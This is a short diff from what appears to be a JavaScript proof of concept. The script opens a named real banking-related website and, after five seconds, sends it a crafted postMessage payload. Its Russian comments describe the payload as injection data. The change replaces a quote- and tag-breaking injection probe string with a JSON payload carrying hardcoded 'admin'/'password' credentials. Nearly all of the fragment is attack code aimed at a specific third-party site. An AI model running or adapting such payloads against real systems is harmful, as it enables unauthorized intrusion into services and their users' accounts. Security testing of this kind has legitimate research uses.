@@ -15,7 +15,7 @@
             var targetWindow = window.open('https://web.koho.ca');
 
             // Определяем payload с инъекционными данными
-            var payload = `{ "key": "xrotx1nm93%2527%2522\`'\"/xrotx1nm93/><xrotx1nm93/\>rfk4zqk4p0&" }`;
+            var payload = `{ "key": "{\"username\":\"admin\", \"password\":\"password\"}" }`;
 
             // Отправляем payload через postMessage спустя 5 секунд после открытия сайта
             setTimeout(function() {
